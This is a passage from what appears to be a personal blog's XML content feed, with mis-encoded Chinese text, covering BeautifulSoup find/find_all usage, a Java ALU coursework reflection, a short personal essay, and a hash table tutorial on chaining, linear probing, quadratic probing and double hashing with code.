è·å–hrefå±æ€§</p></blockquote><h3 id="æ–‡æœ¬"><a href="#æ–‡æœ¬" class="headerlink" title="æ–‡æœ¬"></a>æ–‡æœ¬</h3><blockquote><p><strong>soup.a.string</strong><br> <strong>soup.a.text</strong><br> <strong>soup.a.get_text()</strong><br> ã€æ³¨ã€‘å½“æ ‡ç­¾é‡Œé¢è¿˜æœ‰æ ‡ç­¾çš„æ—¶å€™ï¼Œstringè·å–çš„ä¸ºNoneï¼Œå…¶ä»–ä¸¤ä¸ªè·å–çº¯æ–‡æœ¬å†…å®¹</p></blockquote><h4 id="findæ–¹æ³•"><a href="#findæ–¹æ³•" class="headerlink" title="findæ–¹æ³•"></a>findæ–¹æ³•</h4><blockquote><p><strong>soup.find(â€˜aâ€™)</strong><br> <strong>soup.find(â€˜aâ€™, class_=â€™xxxâ€™)</strong><br> <strong>soup.find(â€˜aâ€™, title=â€™xxxâ€™)</strong><br> <strong>soup.find(â€˜aâ€™, id=â€™xxxâ€™)</strong><br> <strong>soup.find(â€˜aâ€™, id=re.compile(râ€™xxxâ€™))</strong><br> ã€æ³¨ã€‘findåªèƒ½æ‰¾åˆ°ç¬¦åˆè¦æ±‚çš„ç¬¬ä¸€ä¸ªæ ‡ç­¾ï¼Œä»–è¿”å›çš„æ˜¯ä¸€ä¸ªå¯¹è±¡</p></blockquote><h3 id="find-allæ–¹æ³•"><a href="#find-allæ–¹æ³•" class="headerlink" title="find_allæ–¹æ³•"></a>find_allæ–¹æ³•</h3><blockquote><p>è¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œåˆ—è¡¨é‡Œé¢æ˜¯æ‰€æœ‰çš„ç¬¦åˆè¦æ±‚çš„å¯¹è±¡<br> <strong>soup.find_all(â€˜aâ€™)</strong><br> <strong>soup.find_all(â€˜aâ€™, class_=â€™wangâ€™)</strong><br> <strong>soup.find_all(â€˜aâ€™, id=re.compile(râ€™xxxâ€™))</strong><br> <strong>soup.find_all(â€˜aâ€™, limit=2)</strong>   æå–å‡ºå‰ä¸¤ä¸ªç¬¦åˆè¦æ±‚çš„a</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Crawler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ALU Reflection</title>
      <link href="/2021/10/15/ALU%20Reflection/"/>
      <url>/2021/10/15/ALU%20Reflection/</url>
      
        <content type="html"><![CDATA[<h1 id="ALU-Reflection"><a href="#ALU-Reflection" class="headerlink" title="ALU Reflection"></a>ALU Reflection</h1><h2 id="ä¸€ã€-å®ç°è¿‡ç¨‹ä¸­çš„bug"><a href="#ä¸€ã€-å®ç°è¿‡ç¨‹ä¸­çš„bug" class="headerlink" title="ä¸€ã€ å®ç°è¿‡ç¨‹ä¸­çš„bug"></a>ä¸€ã€ å®ç°è¿‡ç¨‹ä¸­çš„bug</h2><ol><li>char ä¸ int çš„è½¬æ¢è€æ˜¯å¿˜è®°â€¦â€¦</li><li>å‡æ³•å‚æ•°ä¼ åäº†ï¼ˆä¸»è¦æ˜¯é¡ºåºä¸ç¬¦åˆæ­£å¸¸é€»è¾‘</li><li>å­—ç¬¦ä¸²ç›¸ç­‰ç”¨ equals</li></ol><h2 id="äºŒã€-åæ€"><a href="#äºŒã€-åæ€" class="headerlink" title="äºŒã€ åæ€"></a>äºŒã€ åæ€</h2><ol><li>ä»£ç æ²¡æœ‰ç»è¿‡å……åˆ†çš„æµ‹è¯•å‰ï¼Œéƒ½æ˜¯é”™è¯¯çš„ï¼Œåœ¨åé¢è°ƒç”¨å‰é¢æœªæµ‹è¯•çš„æ¨¡å—åªä¼šå¢åŠ è°ƒè¯•çš„éº»çƒ¦ã€‚</li><li>å¤šä½¿ç”¨assertå°½æ—©å‘ç°é—®é¢˜</li><li>å·¦ç§»å³ç§»ç”¨çš„è›®å¤šçš„ï¼Œåº”è¯¥æŠ½è±¡ä¸ºå‡½æ•°ï¼Œé‡å¤äº†å¥½å¤šæ¬¡</li></ol><h2 id="ä¸‰ã€-æ”¶è·"><a href="#ä¸‰ã€-æ”¶è·" class="headerlink" title="ä¸‰ã€ æ”¶è·"></a>ä¸‰ã€ æ”¶è·</h2><ol><li><p>æ¢å¤é™¤æ³•å­˜åœ¨çš„bugï¼Œå³è¢«é™¤æ•°ä¸ºè´Ÿä¸é™¤æ•°æ°å¥½ç›¸åŠ ä¸º0æ˜¯ï¼Œè¢«åˆ¤å®šä¸ºå¼‚å·ä¸å¤Ÿé™¤ï¼Œä½†å®é™…æ˜¯å¤Ÿçš„ã€‚<br>è§£å†³æ–¹æ³•ï¼šå¯ä»¥åˆ°æœ€åè°ƒæ•´ä½™æ•°ä¸å•†ã€‚</p></li><li><p>è‡ªå·±å†™æµ‹è¯•ç”¨ä¾‹ï¼Œå°†intæœ€å¤§æœ€å°å€¼ï¼Œ0ï¼Œæ­£è´Ÿç›¸ä¹˜ç­‰è¾¹ç•Œæƒ…å†µåšæµ‹è¯•ï¼Œä¹Ÿå¯ä»¥å†™random</p></li><li><p>charæ•°ç»„è½¬String</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String.valueOf (Arrays.copyOfRange (arr, i, j))</span><br><span class="line">String.valueOf (Arrays.copyOf (arr, Length))</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éšç¬”</title>
      <link href="/2021/09/25/21.09.25%E9%9A%8F%E7%AC%94/"/>
      <url>/2021/09/25/21.09.25%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<p>æ¸¸æˆè¢«å°ç¦ï¼Œæˆ‘æ²¡æœ‰è¯´è¯ï¼Œæˆ‘æˆå¹´äº†ï¼›æ²¡æƒ³åˆ°åˆ€è¿™ä¹ˆå¿«å°±è½åˆ°æ—¥æ¼«ä¸Šäº†<br>å†å²å°†è®°å–çš„ç¤¾ä¼šè½¬å˜çš„æœ€å¤§æ‚²å‰§ä¸æ˜¯åäººçš„å–§åš£ï¼Œè€Œæ˜¯å¥½äººçš„æ²‰é»˜ã€‚â€”â€”é©¬ä¸è·¯å¾·é‡‘<br>æ²‰é»˜çš„äººæ•°è¶Šå¤šï¼Œæ‰“ç ´æ²‰é»˜å°±è¶Šéš¾ï¼Œå› ä¸ºå½“è¶Šæ¥è¶Šå¤šçš„äººå·å…¥æ²‰é»˜çš„æ¼©æ¶¡ï¼Œä»è¿™ä¸ªæ¼©æ¶¡ä¸­æŒ£è„±å‡ºæ¥ï¼Œéœ€è¦çš„åŠ›æ°”å°±è¶Šå¤§ã€‚<br>æˆ¿é—´é‡Œçš„å¤§è±¡æ„ˆå‘è†¨èƒ€ï¼Œä¸€æ­¥æ­¥æŒ¤å‹ç€æ¯ä¸€ä¸ªäººï¼Œæˆ‘åœ¨è¿™ä¸ªæˆ¿é—´é‡Œåˆèƒ½åšäº›ä»€ä¹ˆå‘¢ï¼Œå¤§æ¦‚å”¯æœ‰æ„Ÿæ©</p>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å“ˆå¸Œ</title>
      <link href="/2021/09/03/%E5%93%88%E5%B8%8C/"/>
      <url>/2021/09/03/%E5%93%88%E5%B8%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="å“ˆå¸Œ"><a href="#å“ˆå¸Œ" class="headerlink" title="å“ˆå¸Œ"></a>å“ˆå¸Œ</h1><p>å“ˆå¸Œè¡¨å°±æ˜¯é›†æŸ¥æ‰¾ã€æ’å…¥å’Œåˆ é™¤äºä¸€èº«çš„ä¸€ç§æ•°æ®ç»“æ„ï¼ˆç®—æ³•é¢˜é‡Œä¸€èˆ¬åªæœ‰æ’å…¥å’Œåˆ é™¤æ“ä½œï¼‰ã€‚å“ˆå¸Œçš„è¿‡ç¨‹å°±æ˜¯æŠŠä¸€ä¸ªå¤§çš„æ•°æ®èŒƒå›´æ˜ å°„åˆ°ä¸€ä¸ªè¾ƒå°çš„æ•°æ®èŒƒå›´å†…çš„è¿‡ç¨‹ï¼Œè¿™ä¸€ç‚¹è·Ÿç¦»æ•£åŒ–å¾ˆåƒï¼Œå¯ä»¥æŠŠ<strong>ç¦»æ•£åŒ–</strong>çœ‹æˆæå…¶ç‰¹æ®Šçš„å“ˆå¸Œæ–¹å¼ã€‚</p><p>å› ä¸ºæ•°æ®é‡å¾ˆå¤§ï¼Œå“ˆå¸Œè¡¨éš¾å…ä¼šå‡ºç°ç¢°æ’ï¼Œå°±æ˜¯æŠŠä¸¤ä¸ªä¸ä¸€æ ·çš„æ•°æ˜ å°„æˆä¸€æ ·çš„æ•°ï¼Œkey1 ï¼= key2 ï¼Œhashï¼ˆkey1ï¼‰ == hashï¼ˆkey2ï¼‰è¿™ç§æƒ…å†µï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é¿å…å†²çªã€‚</p><h2 id="å¤„ç†å†²çªçš„æ–¹æ³•"><a href="#å¤„ç†å†²çªçš„æ–¹æ³•" class="headerlink" title="å¤„ç†å†²çªçš„æ–¹æ³•"></a>å¤„ç†å†²çªçš„æ–¹æ³•</h2><p>ä»¥ä¸‹é¢˜ä¸ºä¾‹ï¼š</p><blockquote><p>ç»´æŠ¤ä¸€ä¸ªé›†åˆï¼Œæ”¯æŒå¦‚ä¸‹å‡ ç§æ“ä½œï¼š</p><p>I xï¼Œæ’å…¥ä¸€ä¸ªæ•° xï¼ˆâˆ’10^9^ â‰¤ x â‰¤ 10^9^ï¼‰ï¼›<br>Q xï¼Œè¯¢é—®æ•° x æ˜¯å¦åœ¨é›†åˆä¸­å‡ºç°è¿‡ï¼›<br>ç°åœ¨è¦è¿›è¡Œ N ï¼ˆ1 â‰¤ N â‰¤ 10^5^ï¼‰æ¬¡æ“ä½œï¼Œå¯¹äºæ¯ä¸ªè¯¢é—®æ“ä½œè¾“å‡ºå¯¹åº”çš„ç»“æœã€‚</p><p>è¾“å…¥æ ¼å¼<br>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° Nï¼Œè¡¨ç¤ºæ“ä½œæ•°é‡ã€‚</p><p>æ¥ä¸‹æ¥ N è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸€ä¸ªæ“ä½œæŒ‡ä»¤ï¼Œæ“ä½œæŒ‡ä»¤ä¸º I xï¼ŒQ x ä¸­çš„ä¸€ç§ã€‚</p><p>è¾“å‡ºæ ¼å¼<br>å¯¹äºæ¯ä¸ªè¯¢é—®æŒ‡ä»¤ Q xï¼Œè¾“å‡ºä¸€ä¸ªè¯¢é—®ç»“æœï¼Œå¦‚æœ x åœ¨é›†åˆä¸­å‡ºç°è¿‡ï¼Œåˆ™è¾“å‡ºYesï¼Œå¦åˆ™è¾“å‡º Noã€‚</p></blockquote><h3 id="1-æ‹‰é“¾æ³•â€”â€”æ•°ç»„ä¸é“¾è¡¨çš„ç»“åˆ"><a href="#1-æ‹‰é“¾æ³•â€”â€”æ•°ç»„ä¸é“¾è¡¨çš„ç»“åˆ" class="headerlink" title="1.æ‹‰é“¾æ³•â€”â€”æ•°ç»„ä¸é“¾è¡¨çš„ç»“åˆ"></a>1.æ‹‰é“¾æ³•â€”â€”æ•°ç»„ä¸é“¾è¡¨çš„ç»“åˆ</h3><p>å‡è®¾æˆ‘ä»¬åˆšå¼€å§‹å°†11æ˜ å°„åˆ°3çš„ä½ç½®ä¸Šï¼Œæˆ‘ä»¬å°±åœ¨3çš„ä½ç½®å¤„æ‹‰å‡ºä¸€ä¸ªé“¾ï¼Œå°†11åŠ è¿›å»ï¼›å€˜è‹¥ç¬¬äºŒæ¬¡æ˜ å°„ï¼Œ23ä¹Ÿæ˜ å°„åˆ°äº†3çš„ä½ç½®ï¼Œæˆ‘ä»¬å°±ç»§ç»­æŠŠ23åŠ è¿›å»ã€‚è¿™ç§å¤„ç†å†²çªçš„æ–¹æ³•å°±æ˜¯æ‹‰é“¾æ³•ã€‚</p><p><img src="https://i.loli.net/2021/09/03/XE91BtfRzTClrLZ.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> data)</span> </span>&#123;</span><br><span class="line">    Link link = <span class="keyword">new</span> <span class="built_in">Link</span>(data);</span><br><span class="line">    <span class="keyword">int</span> key = link.<span class="built_in">getKey</span>();</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    array[hashVal].<span class="built_in">insert</span>(link);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Link <span class="title">find</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">return</span> array[hashVal].<span class="built_in">find</span>(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    array[hashVal].<span class="built_in"><span class="keyword">delete</span></span>(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-å¼€æ”¾å¯»å€æ³•"><a href="#2-å¼€æ”¾å¯»å€æ³•" class="headerlink" title="2.å¼€æ”¾å¯»å€æ³•"></a>2.å¼€æ”¾å¯»å€æ³•</h3><p>åŸºæœ¬æ€è·¯æ¯”è¾ƒå®¹æ˜“ç†è§£å°±æ˜¯åªåœ¨ä¸€ä¸ªæ•°ç»„ä¸­è¿›è¡Œæ“ä½œï¼Œé˜²æ­¢æº¢å‡ºèŒƒå›´ä¸€èˆ¬è¦å¼€åˆ°é¢˜ç›®èŒƒå›´çš„2-3å€ã€‚</p><p>å‡å¦‚æˆ‘ä»¬æ±‚å‡ºçš„å“ˆå¸Œå€¼hashï¼ˆxï¼‰ == kï¼Œæˆ‘ä»¬å°±åœ¨ä¸€ä¸ªæ•°ç»„ä»ç¬¬kä¸ªä½ç½®å¼€å§‹ï¼Œå¦‚æœè¯¥ä½ç½®è¢«å ç”¨ï¼Œåˆ™ä¾æ¬¡çœ‹ä¸‹ä¸€ä¸ªä½ç½®ï¼Œç›´åˆ°æ‰¾åˆ°ç©ºä½ç½®ä¸ºæ­¢ã€‚</p><p>æ‰¾ä¸‹ä¸€ä¸ªä½ç½®ä¹Ÿæœ‰ä¸åŒçš„æ–¹æ³•</p><h4 id="çº¿æ€§æ¢æµ‹"><a href="#çº¿æ€§æ¢æµ‹" class="headerlink" title="çº¿æ€§æ¢æµ‹"></a><strong>çº¿æ€§æ¢æµ‹</strong></h4><p>æ’å…¥æ€è·¯å¾ˆæœ´ç´ ï¼šä¸‹æ ‡ä¸€ä½ä¸€ä½åç§»ï¼Œç›´åˆ°ä¸ºç©ºã€‚æŸ¥æ‰¾åŒç†ï¼Œå…ˆç®—å¾—ç†è®ºä¸‹æ ‡ï¼Œå‘åé€ä½æ¯”å¯¹ï¼Œè‹¥éå†è‡³ç©ºä½ï¼Œè¯´æ˜æ²¡æœ‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(Student student)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> key = student.<span class="built_in">getKey</span>();</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null &amp;&amp; array[hashVal].<span class="built_in">getKey</span>() != <span class="number">-1</span>) &#123;</span><br><span class="line">        ++hashVal;</span><br><span class="line">        <span class="comment">// å¦‚æœè¶…è¿‡æ•°ç»„å¤§å°ï¼Œåˆ™ä»ç¬¬ä¸€ä¸ªå¼€å§‹æ‰¾</span></span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line">    array[hashVal] = student;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Student <span class="title">find</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null)&#123;</span><br><span class="line">        <span class="keyword">if</span> (array[hashVal].<span class="built_in">getKey</span>() == key)&#123;</span><br><span class="line">            <span class="keyword">return</span> array[hashVal];</span><br><span class="line">        &#125;</span><br><span class="line">        ++hashVal;</span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çº¿æ€§æ¢æµ‹å“ˆå¸Œè¡¨çš„åˆ é™¤ç›¸å¯¹æ¥è¯´æ¯”è¾ƒå¤æ‚ä¸€ç‚¹ï¼Œæˆ‘ä»¬ä¸èƒ½ç®€å•çš„æŠŠè¿™ä¸€é¡¹æ•°æ®åˆ é™¤ï¼Œè®©å®ƒå˜æˆç©ºï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p>çº¿æ€§æ¢æµ‹å“ˆå¸Œè¡¨åœ¨æŸ¥æ‰¾çš„æ—¶å€™ï¼Œä¸€æ—¦æˆ‘ä»¬é€šè¿‡çº¿æ€§æ¢æµ‹æ–¹æ³•ï¼Œæ‰¾åˆ°ä¸€ä¸ªç©ºé—²ä½ç½®ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¤å®šå“ˆå¸Œè¡¨ä¸­ä¸å­˜åœ¨è¿™ä¸ªæ•°æ®ã€‚ä½†æ˜¯ï¼Œå¦‚æœè¿™ä¸ªç©ºé—²ä½ç½®æ˜¯æˆ‘ä»¬åæ¥åˆ é™¤çš„ï¼Œå°±ä¼š<strong>å¯¼è‡´åŸæ¥çš„æŸ¥æ‰¾ç®—æ³•å¤±æ•ˆ</strong>ã€‚æœ¬æ¥å­˜åœ¨çš„æ•°æ®ï¼Œä¼šè¢«è®¤å®šä¸ºä¸å­˜åœ¨ã€‚</p><p>å› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ä¸ª<strong>ç‰¹æ®Šçš„æ•°æ®</strong>æ¥é¡¶æ›¿è¿™ä¸ªè¢«åˆ é™¤çš„æ•°æ®ï¼Œå› ä¸ºæˆ‘ä»¬çš„å­¦ç”Ÿå­¦å·éƒ½æ˜¯æ­£æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨å­¦å·ç­‰äº<code>-1</code>æ¥ä»£è¡¨è¢«åˆ é™¤çš„æ•°æ®ã€‚è¿™æ ·ä¼šå¸¦æ¥ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä½•åœ¨çº¿æ€§æ¢æµ‹å“ˆå¸Œè¡¨ä¸­åšäº†å¤šæ¬¡æ“ä½œï¼Œä¼šå¯¼è‡´å“ˆå¸Œè¡¨ä¸­å……æ»¡äº†å­¦å·ä¸º<code>-1</code>çš„æ•°æ®é¡¹ï¼Œä½¿çš„å“ˆå¸Œè¡¨çš„æ•ˆç‡ä¸‹é™ï¼Œæ‰€ä»¥å¾ˆå¤šå“ˆå¸Œè¡¨ä¸­æ²¡æœ‰æä¾›åˆ é™¤æ“ä½œï¼Œå³ä½¿æä¾›äº†åˆ é™¤æ“ä½œçš„ï¼Œä¹Ÿå°½é‡å°‘ä½¿ç”¨åˆ é™¤å‡½æ•°ã€‚</p><h4 id="äºŒæ¬¡æ¢æµ‹"><a href="#äºŒæ¬¡æ¢æµ‹" class="headerlink" title="äºŒæ¬¡æ¢æµ‹"></a><strong>äºŒæ¬¡æ¢æµ‹</strong></h4><p>åœ¨çº¿æ€§æ¢æµ‹å“ˆå¸Œè¡¨ä¸­ï¼Œæ•°æ®ä¼šå‘ç”Ÿèšé›†ï¼Œä¸€æ—¦èšé›†å½¢æˆï¼Œå®ƒå°±ä¼šå˜çš„è¶Šæ¥è¶Šå¤§ï¼Œé‚£äº›å“ˆå¸Œå‡½æ•°åè½åœ¨èšé›†èŒƒå›´å†…çš„æ•°æ®é¡¹ï¼Œéƒ½éœ€è¦ä¸€æ­¥ä¸€æ­¥å¾€åç§»åŠ¨ï¼Œå¹¶ä¸”æ’å…¥åˆ°èšé›†çš„åé¢ï¼Œå› æ­¤èšé›†å˜çš„è¶Šå¤§ï¼Œèšé›†å¢é•¿çš„è¶Šå¿«ã€‚è¿™ä¸ªå°±åƒæˆ‘ä»¬åœ¨é€›è¶…å¸‚ä¸€æ ·ï¼Œå½“æŸä¸ªåœ°æ–¹äººå¾ˆå¤šæ—¶ï¼Œäººåªä¼šè¶Šæ¥è¶Šå¤šï¼Œå¤§å®¶éƒ½åªæ˜¯æƒ³çŸ¥é“è¿™é‡Œåœ¨å¹²ä»€ä¹ˆã€‚</p><p>äºŒæ¬¡æ¢æµ‹æ˜¯é˜²æ­¢èšé›†äº§ç”Ÿçš„ä¸€ç§å°è¯•ï¼Œæ€æƒ³æ˜¯æ¢æµ‹ç›¸éš”è¾ƒè¿œçš„å•å…ƒï¼Œè€Œä¸æ˜¯å’ŒåŸå§‹ä½ç½®ç›¸é‚»çš„å•å…ƒã€‚åœ¨çº¿æ€§æ¢æµ‹ä¸­ï¼Œå¦‚æœå“ˆå¸Œå‡½æ•°å¾—åˆ°çš„åŸå§‹ä¸‹æ ‡æ˜¯x,çº¿æ€§æ¢æµ‹å°±æ˜¯x+1,x+2,x+3â€¦â€¦ï¼Œä»¥æ­¤ç±»æ¨ï¼Œè€Œåœ¨äºŒæ¬¡æ¢æµ‹ä¸­ï¼Œæ¢æµ‹è¿‡ç¨‹æ˜¯x+1,x+4,x+9,x+16,x+25â€¦â€¦,ä»¥æ­¤ç±»æ¨ï¼Œåˆ°åŸå§‹è·ç¦»çš„æ­¥æ•°å¹³æ–¹</p><h4 id="åŒå“ˆå¸Œï¼ˆå¸¸ç”¨ï¼‰"><a href="#åŒå“ˆå¸Œï¼ˆå¸¸ç”¨ï¼‰" class="headerlink" title="åŒå“ˆå¸Œï¼ˆå¸¸ç”¨ï¼‰"></a><strong>åŒå“ˆå¸Œ</strong>ï¼ˆå¸¸ç”¨ï¼‰</h4><p>åŒå“ˆå¸Œæ˜¯ä¸ºäº†æ¶ˆé™¤åŸå§‹èšé›†å’ŒäºŒæ¬¡èšé›†é—®é¢˜ï¼Œä¸ç®¡æ˜¯çº¿æ€§æ¢æµ‹è¿˜æ˜¯äºŒæ¬¡æ¢æµ‹ï¼Œæ¯æ¬¡çš„æ¢æµ‹æ­¥é•¿éƒ½æ˜¯å›ºå®šçš„ã€‚åŒå“ˆå¸Œæ˜¯é™¤äº†ç¬¬ä¸€ä¸ªå“ˆå¸Œå‡½æ•°å¤–å†å¢åŠ ä¸€ä¸ªå“ˆå¸Œå‡½æ•°ç”¨æ¥æ ¹æ®å…³é”®å­—ç”Ÿæˆæ¢æµ‹æ­¥é•¿ï¼Œè¿™æ ·å³ä½¿ç¬¬ä¸€ä¸ªå“ˆå¸Œå‡½æ•°æ˜ å°„åˆ°äº†æ•°ç»„çš„åŒä¸€ä¸‹æ ‡ï¼Œä½†æ˜¯æ¢æµ‹æ­¥é•¿ä¸ä¸€æ ·ï¼Œè¿™æ ·å°±èƒ½å¤Ÿè§£å†³èšé›†çš„é—®é¢˜ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(Student student)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> key = student.<span class="built_in">getKey</span>();</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="comment">// è·å–æ­¥é•¿</span></span><br><span class="line">    <span class="keyword">int</span> stepSize = <span class="built_in">stepHash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null &amp;&amp; array[hashVal].<span class="built_in">getKey</span>() != <span class="number">-1</span>) &#123;</span><br><span class="line">        hashVal +=stepSize;</span><br><span class="line">        <span class="comment">// å¦‚æœè¶…è¿‡æ•°ç»„å¤§å°ï¼Œåˆ™ä»ç¬¬ä¸€ä¸ªå¼€å§‹æ‰¾</span></span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line">    array[hashVal] = student;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Student <span class="title">find</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">int</span> stepSize = <span class="built_in">stepHash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array[hashVal].<span class="built_in">getKey</span>() == key) &#123;</span><br><span class="line">            <span class="keyword">return</span> array[hashVal];</span><br><span class="line">        &#125;</span><br><span class="line">        hashVal +=stepSize;</span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Student <span class="title">delete</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">int</span> stepSize = <span class="built_in">stepHash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array[hashVal].<span class="built_in">getKey</span>() == key) &#123;</span><br><span class="line">            Student temp = array[hashVal];</span><br><span class="line">            array[hashVal] = noStudent;</span><br><span class="line">            <span class="keyword">return</span> temp;</span><br><span class="line">        &#125;</span><br><span class="line">        hashVal +=stepSize;</span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒå“ˆå¸Œçš„å®ç°æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯åŒå“ˆå¸Œæœ‰ä¸€ä¸ªç‰¹åˆ«é«˜çš„è¦æ±‚å°±æ˜¯è¡¨çš„å®¹é‡éœ€è¦æ˜¯ä¸€ä¸ªè´¨æ•°ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p><strong>ä¸ºä»€ä¹ˆåŒå“ˆå¸Œéœ€è¦å“ˆå¸Œè¡¨çš„å®¹é‡æ˜¯ä¸€ä¸ªè´¨æ•°ï¼Ÿ</strong></p><p>å‡è®¾æˆ‘ä»¬å“ˆå¸Œè¡¨çš„å®¹é‡ä¸º15ï¼ŒæŸä¸ª<strong>ã€Œå…³é”®å­—ã€</strong>ç»è¿‡åŒå“ˆå¸Œå‡½æ•°åå¾—åˆ°çš„æ•°ç»„ä¸‹æ 